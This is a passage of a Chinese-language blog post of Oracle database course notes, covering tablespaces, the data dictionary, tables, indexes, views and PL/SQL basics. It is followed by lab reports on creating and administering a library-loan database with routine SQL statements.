id="数据库系统组成"><a href="#数据库系统组成" class="headerlink" title="数据库系统组成"></a>数据库系统组成</h4><p>与其他关系数据库系统一样，都是由用户、数据库、数据库管理系统和数据库应用程序4个部分组成。</p><h5 id="数据库用户"><a href="#数据库用户" class="headerlink" title="数据库用户"></a>数据库用户</h5><p>数据库用户就是数据库系统的使用人员</p><h5 id="数据库应用程序"><a href="#数据库应用程序" class="headerlink" title="数据库应用程序"></a>数据库应用程序</h5><p>数据库应用程序是一种在DBMS支持下对数据进行访问处理的应用程序。使用编程语言(如JAVA、C++等)实现对数据库信息的操作访问，但它们需要基于DBMS提供的本地驱动接口或标准接口(如ODBC、JDBC等)才能连接与访问数据库</p><h5 id="数据库管理系统"><a href="#数据库管理系统" class="headerlink" title="数据库管理系统"></a>数据库管理系统</h5><p>database manage system，DBMS——是一种专门用来传建数据库，管理数据库，维护数据库，并对外提供数据库功能的</p><p>主要功能有：</p><ul><li>创建数据库、数据库表及其他对象</li><li>读写、修改和删除数据库表数据</li><li>维护数据库结构</li><li>执行数据访问规则</li><li>提供数据库并发控制和安全控制</li><li>执行数据库备份和恢复</li><li>···</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113112351876.png" alt="image-20231113112351876" style="zoom:50%;" /><h6 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h6><p>在oracle数据库中，主要采用关系表组织与存储数据。除了存储和管理应用的用户数据外，还需要存储与管理数据库本身的元数据、索引数据、运行数据等系统数据</p><p>数据库中所包含的各类数据内容：</p><ul><li>用户数据</li><li>元数据(数据表的表名称、表属性、列名称、列属性、表之间的数据约束关系)</li><li>索引数据</li><li>其他数据</li></ul><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><h5 id="数据库逻辑结构"><a href="#数据库逻辑结构" class="headerlink" title="数据库逻辑结构"></a>数据库逻辑结构</h5><blockquote><p>逻辑存储结构</p></blockquote><p>数据库(Database)-&gt;表空间(Tablespace)-&gt;段(Segment)-&gt;区(Extend)-&gt;数据块(Data Block)</p><blockquote><p>表空间</p></blockquote><p>是在数据库下的定级结构单元，用于存储各种数据库对象的段数据</p><p>表空间类型：</p><ul><li>SYSTEM表空间：用于存储整个数据库的元数据和系统运行数据</li><li>STSAUX表空间：用于存储软件选件功能模块使用数据</li><li>TEMP表空间：用于存储临时对象数据</li><li>UNDO表空间：用于存储数据库还原数据，以便进行恢复处理</li><li>USERS表空间：用于存储用户和应用数据</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113144227499.png" alt="image-20231113144227499" style="zoom: 50%;" /><blockquote><p>段</p></blockquote><p>表空间中划分的不同存储区域，例如表空间划分为存放数据的数据段，存放临时数据的临时段和存放回滚数据的回滚段。</p><blockquote><p>区</p></blockquote><p>由若干连续数据块组成的存储区，用于存放特定数据类型的数据。对象分配空间是以区为单位的，一个数据库对象至少包含一个区。每个区又由多个数据块组成。</p><blockquote><p>数据块</p></blockquote><p>是数据库存取的最小存储单元，由若干数据字节组成。通常Oracle数据块是操作系统数据块的倍数</p><h5 id="数据库物理结构"><a href="#数据库物理结构" class="headerlink" title="数据库物理结构"></a>数据库物理结构</h5><p>数据库物理结构如下：</p><ul><li>数据文件(xxx.DBF)    -&gt;   存储数据库对象结构及其数据</li><li>控制文件(xxx.CTL)     -&gt;   记录数据库文件位置、数据库名称、创建时间和日志记录序号等控制信息</li><li>重做日志文件(xxx.LOG)    -&gt;    记录数据库事务的日志信息。数据库被破坏时，可以利用日志文件的数据来恢复数据库</li></ul><h4 id="数据字典"><a href="#数据字典" class="headerlink" title="数据字典"></a>数据字典</h4><blockquote><p>在Oracle数据库库系统中，系统数据库信息、数据库对象信息和用户管理信息等元数据都需要在数据库中进行记录，以便在运行中使用。</p></blockquote><p>在Oracle数据库系统中，数据库出用来存储用户数据外，还会使用系统数据表存放系统元数据。通常将数据库中<strong>存放系统元数据的数据库表及其视图集合</strong>称为数据字典。存放在SYSTEM表空间，用途为：</p><ul><li>通过存取数据字典，可访问数据库中所有数据库对象及其存储结构信息</li><li>当系统执行数据库对象操作的DDL语句后，在数据字典中记录与维护该对象的元数据</li></ul><h5 id="静态数据字典视图"><a href="#静态数据字典视图" class="headerlink" title="静态数据字典视图"></a>静态数据字典视图</h5><table><thead><tr><th align="center">前缀</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">ALL_</td><td align="center">所有数据库用户都可以访问，只要提供用户有关的对象信息</td></tr><tr><td align="center">DBA_</td><td align="center">仅有DBA访问，主要提供系统和对象信息</td></tr><tr><td align="center">USER_</td><td align="center">仅有数据库用户访问，内容因用户而不同</td></tr></tbody></table><p>一般名称尾部还有$字符。</p><h5 id="动态数据字典视图"><a href="#动态数据字典视图" class="headerlink" title="动态数据字典视图"></a>动态数据字典视图</h5><p>主要提供数据库运行状态数据查看，如当前数据库内存使用与分配信息。文件状态信息、任务调度与作业进展信息等。主要是以V$或V_$为前缀</p><h4 id="数据库操作语言"><a href="#数据库操作语言" class="headerlink" title="数据库操作语言"></a>数据库操作语言</h4><blockquote><p>SQL语言</p></blockquote><p>Oracle对标准SQL进行了扩展。扩展 的Oracle SQL语句可以分为以下几种类型：</p><ul><li>对象定义语言语句(Data Definition Language ,DDL)</li><li>数据库操纵语言语句(Data Manipulation Language，DML)</li><li>事务控制语句(Transacation Control Statements)</li><li>会话控制语句(Session Control Statements)</li><li>系统控制语句(System Control Statement)</li><li>嵌入SQL语句(Embedded SQL Statements)</li></ul><blockquote><p>PL&#x2F;SQL语言</p></blockquote><p>是Oracle数据库在SQL语言基础上进行过程扩展处理的编程语言，支持所有Oracle的SQL语句，函数和数据类型，并能进行循环、分支和嵌套等过程编程处理。</p><blockquote><p>JAVA语言</p></blockquote><p>后端数据库程序编程除了使用PL&#x2F;SQL语言外，也可以使用JAVA进行过程编程处理。Oracle数据库支持JAVA应用开发、部署和存储。</p><hr><h2 id="数据库与表空间"><a href="#数据库与表空间" class="headerlink" title="数据库与表空间"></a>数据库与表空间</h2><h3 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库"></a>数据库</h3><p>完整的Oracle数据库通常由两部分组成：Oracle数据库和数据库实例。 </p><ul><li>数据库是一系列物理文件的集合（数据文件，控制文件，联机日志，参数文件等）； </li><li>Oracle数据库实例则是一组Oracle后台进程&#x2F;线程以及在服务器分配的共享内存区。</li></ul><p>在启动Oracle数据库服务器时，实际上是在服务器的内存中创建一个Oracle实例（即在服务器内存中分配共享内存并创建相关的后台内存），然后由这个Oracle数据库实例来访问和控制磁盘中的数据文件。Oracle有一个很大的内存快，成为全局区（SGA）。</p><h4 id="普通数据库"><a href="#普通数据库" class="headerlink" title="普通数据库"></a>普通数据库</h4><p>从物理结构来看，Oracle数据库由若干文件组成，主要包括&#x3D;&#x3D;数据文件、控制文件和日志文件&#x3D;&#x3D;。创建数据库实际上就是在操作系统中建立这些数据库文件，以便数据库服务器利用这些文件对数据库进行数据存储与管理。</p><h4 id="多租户数据库"><a href="#多租户数据库" class="headerlink" title="多租户数据库"></a>多租户数据库</h4><p>在云计算服务领域中，多租户技术是指多个租户共用一个相同的应用或服务时，仍可确保用户之间的数据隔离。云服务软件与传统软件的数据库实现技术的区别在于云服务软件采用了多租户数据库模式技术解决租户之间的数据隔离。在多租户数据库模式下，各个租户虽然运行在同一数据库系统中，但它们只能查看和修改自己的数据集合，租户之间相互独立，彼此互不影响。实现多租户数据库模式主要有以下三个方案</p><p>&#x3D;&#x3D;租户使用独立数据库&#x3D;&#x3D;</p><p>每个租户在使用应用系统服务时，采用各自独立的数据库解决租户之间的数据隔离问题。</p><p>特点是：有助于数据模型的拓展设计，满足不同租户的独特需求，用户数据隔离级别最高，安全性最好，但成本高</p><p>&#x3D;&#x3D;租户共享数据库、隔离Schema&#x3D;&#x3D;</p><p>租户使用应用系统服务时，采用统一数据库，在数据库中通过不同的用户Schema解决租户之间的数据隔离问题。</p><p>特点是：为安全性要求较高的租户提供了一定程度的逻辑数据隔离，但并不是完全隔离；如果出现故障，数据恢复比较困难，因为恢复数据库将牵扯到其他租户的数据；如果需要跨租户统计数据，也存在一定的困难。</p><p>&#x3D;&#x3D;租户共享数据库、共享Schema&#x3D;&#x3D;</p><p>租户共享数据库、共享Schema，但在表中童年过Ten-andID解决租户之间的数据隔离。</p><p>特点是：共享程度最高，隔离级别最低，需要在设计开发时加大对安全处理的开发量；数据备份和恢复最难，需要逐表逐条备份还原。</p><h5 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h5><p>在oracle数据库系统中，容器数据库 (Container Database，CDB) 是指能够容纳0个、1个或多个插接式数据库(Pluggable Databases，PDB)的数据库。结构如下图</p><img src="C:/Users/%E6%9D%A8%E6%AC%A3%E7%84%B6/AppData/Roaming/Typora/typora-user-images/image-20240110172647830.png" alt="image-20240110172647830" style="zoom: 33%;" /><h4 id="数据表空间"><a href="#数据表空间" class="headerlink" title="数据表空间"></a>数据表空间</h4><p>在oracle数据库逻辑结构中，表空间是数据库之中最高层次的逻辑存储结构，即数据库是由若干表空间构成。在创建数据库时，系统自动为每个数据库建立几个默认的表空间，此外，用户还可以为应用创建及管理自己的表空间。</p><p>表空间是一种逻辑容器，它用于组织各种数据库对象(表、索引、视图、存储过程触发器等)的逻辑存储，并管理相关的数据文件。表空间在oracle数据库的逻辑结构组织和物理结构管理中扮演重要的作用</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110174844718.png" alt="image-20240110174844718" style="zoom: 33%;" /><p>Oracle数据库是<strong>通过表空间来存储物理表</strong>的，一个数据库实例可以有N个表空间，一个表空间下可以有N张表。</p><p>数据文件是物理的，一个表空间可以包含多个数据文件，而一个数据文件只能隶属一个表空间。</p><p>创建表空间语法：</p><p><code>Create TableSpace 表空间名称 DataFile  表空间数据文件路径 Size 表空间初始大小 Autoextend on</code></p><p>查看已经创建好的表空间：</p><p><code>select default_tablespace, temporary_tablespace, d.username   from dba_users d</code></p><h2 id="数据库对象"><a href="#数据库对象" class="headerlink" title="数据库对象"></a>数据库对象</h2><p>数据库对象是构成数据库的组成元素。一个Oracle数据库可以存储多种类型对象，如表、索引、视图、处处过程、触发器、序列、同义词和包等。在使用oracle数据库前，必须在数据库中创建基本的数据库对象，并由不同用户schema分别组织这些对象集合。当在数据库中创关键表对象后，就可以对表对象进行数据增删改查访问操作。</p><h3 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h3><p>表是关系数据库中最基本的数据库对象，它是存储数据的基本逻辑容器。一个我让车开了关系数据库通常需要建立较多的表。其中一些用于存储描述数据库结构的元数据和系统运行数据，这些被称为<strong>系统表或数据字典</strong>。另外一些表用于存储用户的应用数据，这些表被统称为<strong>用户表</strong>。</p><h4 id="表类型"><a href="#表类型" class="headerlink" title="表类型"></a>表类型</h4><p>&#x3D;&#x3D;关系表&#x3D;&#x3D;</p><p>关系表是oracle数据库中使用最多的一类数据库表。该类表按照关系模型方式处理数据访问。在创建oracle关系表时，默认按堆方式存储数据，有时也将它称为堆。在用堆方式存储数据时，表中的行数据由B-树索引指针定位，该行数据可在磁盘块中任意顺序位置存放。</p><p>&#x3D;&#x3D;对象表&#x3D;&#x3D;</p><p>对象表是一种在oracle数据库中以对象数据类型方式所创建的表。对象表中，每行分别储存处不同用户的数据。</p><p>&#x3D;&#x3D;临时表&#x3D;&#x3D;</p><p>临时表与常规表(关系表。对象表)一样也是用于存储数据的表对象，但是临时表在数据库中仅用于残存数据。当数据库实例种植后，系统将清除临时表及其数据。</p><p>&#x3D;&#x3D;索引组织表&#x3D;&#x3D;</p><p>索引组织表按照表的逐渐索引值顺序在磁盘块中组织进行数据存储，并且将行数据存放在索引叶结点存储块中。索引组织表支持应用对该表中进行范围查询，可实现高性能访问和高空存储空间访问率。</p><p>&#x3D;&#x3D;外部表&#x3D;&#x3D;</p><p>外部表是一类在数据库中存储元数据，而外部表数据本身存储在数据库之外的文件中。外部表在数据库中通常为中毒。</p><h4 id="用户schema"><a href="#用户schema" class="headerlink" title="用户schema"></a>用户schema</h4><p>在一个oracle数据库中，通常会存储很多不用用户的数据库对象，如表、索引、视图、触发器、存储过程、序列和同义词等。为了便于各个用户的数据库对象集合的组织管理，在数据库中需要先创建用户，同时系统也会创建与该用户同名的schema，作为该用户拥有数据库对象的逻辑容器。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110184523270.png" alt="image-20240110184523270" style="zoom: 50%;" /><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>索引(index)是一种针对表中指定列的值进行排序的数据结构，使用它可以加快表中数据的查询访问。例如，一个雇员信息表中有数万个雇员的行数据。若要对该表进行雇员信息查询，最基本的信息查询方式是全表检索，即将表中所有雇员的行数据一一取出，并与查询条件逐一对比，然后返回满足条件的行数据。这样的数据查询会带来DBMS的大量开销。当在有索引的表中进行数据查询时，首先在该表的索引结构中查找符合条件的索引值，然后再根据索引值所关联的地址指针在磁盘数据块中直接定位到对应的数据记录，从而实现快速数据查询。</p><p>为什么添加了索引之后，会加快查询速度呢？<br>图书馆：如果杂乱地放书的话检索起来就非常困难,所以将书分类，然后再建一个箱子，箱子里面放卡片，卡片里面可以按类查询,按书名查或者类别查,这样的话速度会快很多很多，这个就有点像索引。索引的好处就是提高你找到书的速度，但是正是因为你建了索引，就应该有人专门来维护索引，维护索引是要有时间精力的开销的，也就是说索引是不能乱建的。<br>所以建索引有个原则：如果有一个字段如果不经常查询，就不要去建索引。现在把书变成我们的表，把卡片变成我们的索引，就知道为什么索引会快，为什么会有开销。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">范例：给 person 表的 name 建立索引</span><br><span class="line"><span class="keyword">create</span> index pname_index <span class="keyword">on</span> person(name);</span><br><span class="line">范例：给 person 表创建一个 name 和 gender 的索引</span><br><span class="line"><span class="keyword">create</span> index pname_gender_index <span class="keyword">on</span> person(name, gender);</span><br></pre></td></tr></table></figure><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><p>视图是一种建立在基础表或其他视图之上的虚拟表。用户同样可以使用SQL语句对视图进行数据插入、修改、删除和年数据查询处理。</p><p>视图就是提供一个查询的窗口，所有数据来自于原表<br> 语法 ： <code>CREATE VIEW 视图名称 AS 子查询</code></p><p>视图的作用？<br> 第一：视图可以屏蔽掉一些敏感字段。<br> 第二：保证总部和分部数据及时统一。（总部操纵实际的表，分部查询视图这样保证数据的统一）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">---查询语句创建表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp <span class="keyword">as</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> scott.emp;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment">---创建视图【必须有dba权限】</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> v_emp <span class="keyword">as</span> <span class="keyword">select</span> ename, job <span class="keyword">from</span> emp;</span><br><span class="line"><span class="comment">---查询视图</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> v_emp;</span><br><span class="line"><span class="comment">---修改视图[不推荐]，实际的数据也会改变</span></span><br><span class="line"><span class="keyword">update</span> v_emp <span class="keyword">set</span> job<span class="operator">=</span><span class="string">&#x27;CLERK&#x27;</span> <span class="keyword">where</span> ename<span class="operator">=</span><span class="string">&#x27;ALLEN&#x27;</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="comment">---创建只读视图</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> v_emp1 <span class="keyword">as</span> <span class="keyword">select</span> ename, job <span class="keyword">from</span> emp <span class="keyword">with</span> read <span class="keyword">only</span>;</span><br></pre></td></tr></table></figure><h2 id="后端编程"><a href="#后端编程" class="headerlink" title="后端编程"></a>后端编程</h2><h3 id="PL-SQL概述"><a href="#PL-SQL概述" class="headerlink" title="PL&#x2F;SQL概述"></a>PL&#x2F;SQL概述</h3><p>PL&#x2F;SQL是过程语言(Procedural Language) 与结构化查询语言(SQL)结合而成的编程语言，它是标准SQL语言的功能不成。SQL语言适合关系关系型数据库，但是无法满足应用程序对数据更复杂的处理需求。PL&#x2F;SQL语言支持多种数据类型，如大对象和集合类型，可使用条件和循环等控制结构，用于创建存储过程、函数、书法器、PL&#x2F;SQL包和用户自定义函数，给SQL语言的执行添加程序逻辑。oracle PL&#x2F;SQL在企业及应用程序中的应用广泛，而且oracle的一些功能部件也是使用PL&#x2F;SQL编写的。</p><h4 id="结构快"><a href="#结构快" class="headerlink" title="结构快"></a>结构快</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--PL/SQL块基本结构：</span></span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    variable_name [CONSTANT] type[(size)] [<span class="keyword">NOT</span> <span class="keyword">NULL</span>] [:<span class="operator">=</span><span class="keyword">value</span>];  </span><br><span class="line">       <span class="comment">-- DECLARE 可选,声明部分: </span></span><br><span class="line">       <span class="comment">--在此声明PL/SQL用到的变量,常量,类型,游标 以及局部的存储过程和函数;</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">       <span class="comment">-- BEGIN~end 必须项,执行部分:</span></span><br><span class="line">       <span class="comment">-- 在此编写执行的过程 及 SQL语句,即程序的主要部分;</span></span><br><span class="line">       EXCEPTION</span><br><span class="line">                <span class="comment">-- EXCEPTION 可选,指定出现错误时需要执行的操作</span></span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">        <span class="comment">-- end: 表示Pl/sql块的结束,别忘了分号结尾;</span></span><br><span class="line">        <span class="comment">-- variable_name:变量名称</span></span><br><span class="line"><span class="comment">-- [CONSTANT]   :可选表示是否为常量</span></span><br><span class="line"><span class="comment">-- type         :表示变量的数据类型</span></span><br><span class="line"><span class="comment">-- [(size)]     :可选,数据类型的长度</span></span><br><span class="line"><span class="comment">-- [NOT NULL]   :可选,该变量是否可以为空</span></span><br><span class="line"><span class="comment">-- [:=value]    :可选,使用 := 给对于对象赋值 初始值;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 上面是PL/SQL块的基本结构, BEGIN~END; 是必须的 声明部分和异常处理部分并不是必须的..</span></span><br><span class="line"><span class="comment">-- 是PL/SQL中的单行注释    /**/ 多行注释;</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;demo&#x3D;&#x3D;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- scott用户下emp举例</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">--PL/SQL 根据输入id,获得当前用户名 JOB</span></span><br><span class="line"><span class="comment">-- 方式一:PL/SQL块 注意分号~</span></span><br><span class="line"><span class="keyword">declare</span></span><br><span class="line">       <span class="comment">--声明变量 id ename job, 每一个变量之间 ; 分号分隔...</span></span><br><span class="line">       <span class="comment">--id 通过 :=值 进行赋默认值,并通过 &amp;xxx由Oracle工具输入参数;</span></span><br><span class="line">       v_id number :<span class="operator">=</span><span class="operator">&amp;</span>myid;  <span class="comment">--还可以把: &amp;myid手动输入换位固定的 :=7934; 固定的id号;</span></span><br><span class="line">       v_ename varchar2(<span class="number">50</span>);</span><br><span class="line">       v_JOB varchar2(<span class="number">50</span>);</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">      <span class="keyword">select</span> ename , job </span><br><span class="line">             <span class="keyword">into</span> v_ename,v_JOB </span><br><span class="line">             <span class="keyword">from</span> emp <span class="keyword">where</span> empno <span class="operator">=</span> v_id;</span><br><span class="line">      dbms_output.put_line(<span class="string">&#x27;用户名&#x27;</span><span class="operator">||</span>v_ename<span class="operator">||</span><span class="string">&#x27;职位: &#x27;</span><span class="operator">||</span>v_JOB);</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="comment">--  还可以通过: select into                          给变量进行赋值 </span></span><br><span class="line"><span class="comment">--  select 列1,列2 into 变量1,变量2 form 表          形式进行下标自动映射赋值..因此列类型和变量类型 顺序都要尽量对应</span></span><br><span class="line"><span class="comment">-- dbms_output.put_line();                           Oracle还可以通过该语句进行数据打印输出...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 方式二: 解决了不清楚变量与列的类型</span></span><br><span class="line"><span class="keyword">declare</span></span><br><span class="line">       v_id    emp.empno<span class="operator">%</span>type :<span class="operator">=</span><span class="operator">&amp;</span>id; </span><br><span class="line">       v_ename emp.ename<span class="operator">%</span>type;</span><br><span class="line">       v_JOB   emp.job<span class="operator">%</span>type;</span><br><span class="line">       v_emp   emp<span class="operator">%</span>Rowtype;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">      <span class="keyword">select</span> ename , job </span><br><span class="line">             <span class="keyword">into</span> v_ename,v_JOB</span><br><span class="line">             <span class="keyword">from</span> emp <span class="keyword">where</span> empno <span class="operator">=</span> v_id;</span><br><span class="line">      dbms_output.put_line(<span class="string">&#x27;用户名&#x27;</span><span class="operator">||</span>v_ename<span class="operator">||</span><span class="string">&#x27;职位: &#x27;</span><span class="operator">||</span>v_JOB);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> v_emp <span class="keyword">from</span> emp <span class="keyword">where</span> empno <span class="operator">=</span> v_id;</span><br><span class="line">      dbms_output.put_line(<span class="string">&#x27;用户名&#x27;</span><span class="operator">||</span>v_emp.ename<span class="operator">||</span><span class="string">&#x27;职位: &#x27;</span><span class="operator">||</span>v_emp.job);</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="comment">-- 表.列%type:  可以在不清楚列类型时候给设置类型;</span></span><br><span class="line"><span class="comment">-- 表%ROWTYPE:  可以在不知道表中列个数 和 数据类型时候,可以通过  表%ROWTYPE 获取一个表类型变量...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实验一：“图书借阅管理系统”Oracle-数据库创建与维护"><a href="#实验一：“图书借阅管理系统”Oracle-数据库创建与维护" class="headerlink" title="实验一：“图书借阅管理系统”Oracle 数据库创建与维护"></a>实验一：“图书借阅管理系统”Oracle 数据库创建与维护</h2><h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>在 windows 系统下，利用 database Configuration assistance 创建相应数据库，并使用 sql developer 和 sql plus 对 Oracle 数据库进行相应的管理等操作。</p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><ul><li>图书借阅管理系统数据库 Lib 创建。</li><li>在 Oracle 数据库服务器中对 Lib 数据库启停控制。</li><li>Lib 数据库连接与基本 DBA 功能查看访问。</li><li>对 Lib 数据库进行初始化配置参数修改。</li><li>在 Lib 数据库中，对默认 user 表空间增加数据文件。</li><li>在 Lib 数据库中，创建用户表空间 T_Lib。</li><li>在 Lib 数据库中，修改用户表空间 T_Lib 配置参数。</li><li>在 Lib 数据库中，删除表空间 T_Lib。</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="数据库创建"><a href="#数据库创建" class="headerlink" title="数据库创建"></a>数据库创建</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113154224639.png" alt="image-20231113154224639" style="zoom: 33%;" /><p>创建成功，管理口令的地方把sys的口令改了。</p><h4 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h4><p>由于本人SQL developer莫名其妙不见了，所以下载了PL&#x2F;SQL Developer作为数据库连接工具。</p><p>发现没有开启监听程序还是啥，打开Oracle Net Config Assistant 重新配置监听程序，设置默认端口1521。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113215951229.png" alt="image-20231113215951229" style="zoom: 33%;" /><p>然后使用navicat进行连接，注意sys用户是需要在高级的地方设置身份！</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113220439385.png" alt="image-20231113220439385" style="zoom:33%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113220509874.png" alt="image-20231113220509874" style="zoom:33%;" /><h4 id="创建表空间"><a href="#创建表空间" class="headerlink" title="创建表空间"></a>创建表空间</h4><p><code>create tablespace T_lib datafile &#39;E:\app\oracle\oradata\LIB\DATAFILE\T_lib.DBF&#39; size 8M autoextend on next 5M maxsize 10M;</code></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113220936097.png" alt="image-20231113220936097" style="zoom:33%;" /><p>修改表空间配置。设置表空间自动扩容，设置最大容量</p><p><code>alter database DATAFILE &#39;E:\app\oracle\oradata\LIB\DATAFILE\T_lib.DBF&#39;  autoextend on next 200M maxsize 500M;</code></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113221229121.png" alt="image-20231113221229121" style="zoom:33%;" /><p>删除表空间</p><p><code>drop tablespace T_lib;</code></p><h2 id="实验二：“图书借阅管理系统”Oracle-数据库对象创建与-SQL-操作"><a href="#实验二：“图书借阅管理系统”Oracle-数据库对象创建与-SQL-操作" class="headerlink" title="实验二：“图书借阅管理系统”Oracle 数据库对象创建与 SQL 操作"></a>实验二：“图书借阅管理系统”Oracle 数据库对象创建与 SQL 操作</h2><h3 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理"></a>实验原理</h3><p>数据库对象的创建应在 sys 账户登陆的情况下，在 sqldeveloper 中选择新建用户，设<br>置用户名，授予用户所需的权限并设定密码。创建完数据库对象后即可在 sqldeveloper 中<br>创建该数据库对象所对应的链接，然后进入到该链接对该数据库对象中的表进行相应的创<br>建、修改、删除、查询、统计等操作</p><h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><ul><li>在Lib数据库中，创建一个方案对象 Library_DBA。</li><li>设计 Lib 数据库各关系表结构，以及视图、索引、序列等。</li><li>编程与执行 SQL 程序，在 Library_DBA 方案中，创建 Lib 数据库的表、视图、索引、序列等对象。</li><li>在 Library_DBA 方案中，对数据库表进行数据插入、数据修改、数据删除 SQL 操作。</li><li>在 Library_DBA 方案中，对数据库表进行数据查询、数据统计 SQL 操作</li></ul><h3 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="创建方案对象"><a href="#创建方案对象" class="headerlink" title="创建方案对象"></a>创建方案对象</h4><p>在navicat中创建一个用户，点击用户，选择新建用户，搜了一下创建报错公共用户名或角色无效的解决方法就是在用户名前加<code>C##</code>事实上也确实创建成功了<code>C##LIBRARY_DBA</code></p><h5 id="设置服务器权限"><a href="#设置服务器权限" class="headerlink" title="设置服务器权限"></a>设置服务器权限</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113223829390.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113223816027.png" alt="image-20231113223816027" style="zoom: 50%;" /><h5 id="用刚才创建的用户登录"><a href="#用刚才创建的用户登录" class="headerlink" title="用刚才创建的用户登录"></a>用刚才创建的用户登录</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113235436241.png" alt="image-20231113235436241" style="zoom:50%;" /><p>注意点击高级，选择角色为default</p><h4 id="编写SQL语句"><a href="#编写SQL语句" class="headerlink" title="编写SQL语句"></a>编写SQL语句</h4><p>在 Library_DBA 空间中设计并编写 sql 程序，使其创建出名为reader\employee\title\book\loan\reserve 的五个表。设计表时注意表之间的约束关系，防止表创建不成功。创建的先后顺序为：reader\title 表，再 book 表，最后 